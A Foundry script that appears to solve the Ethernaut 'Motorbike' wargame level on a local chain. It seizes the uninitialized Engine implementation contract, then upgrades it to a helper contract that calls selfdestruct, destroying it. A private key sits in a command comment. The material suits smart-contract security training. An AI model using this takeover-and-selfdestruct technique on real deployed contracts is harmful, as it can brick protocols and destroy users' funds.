// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external;
}

interface IEthernaut {
    function createLevelInstance(address level) external payable;
    function submitInstance(address instance) external;
}
contract A {
    function destroy() public {
        selfdestruct(payable(tx.origin));
    }
}

contract Helper {
    address public level = 0x84eA74d481Ee0A5332c457a4d796187F6Ba67fEB;
    function trigger(address ethernaut, address newMortorInstance, address newEngineInstance) public {
        IEthernaut(ethernaut).createLevelInstance(level);
        ITarget target = ITarget(newEngineInstance);
        target.initialize();

        A a = new A();
        target.upgradeToAndCall(address(a), abi.encodeWithSignature("destroy()"));
    }
}

contract SolveScript is Script {
    address public target = 0xDa1A2E33BD9E8ae3641A61ab72f137e61A7edf6e;
    address public ethernaut = 0x5FbDB2315678afecb367f032d93F642f64180aa3;
    address public level = 0x84eA74d481Ee0A5332c457a4d796187F6Ba67fEB;

    function setUp() public {}

    // forge script -vvvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        console.log("start");

        address EngineInstance = vm.computeCreateAddress(level, vm.getNonce(level));
        address MortorInstance = vm.computeCreateAddress(level, vm.getNonce(level)+1);

        console.log("EngineInstance address : %s", EngineInstance);
        console.log("MortorInstance address : %s", MortorInstance);
        console.log("EngineInstance code length : %d", address(EngineInstance).code.length);
        console.log("MortorInstance code length : %d", address(MortorInstance).code.length);
        Helper helper = new Helper();
        helper.trigger(ethernaut, MortorInstance, EngineInstance);

        console.log("EngineInstance code length : %d", address(EngineInstance).code.length);
        console.log("MortorInstance code length : %d", address(MortorInstance).code.length);


        vm.stopBroadcast();
    }
}
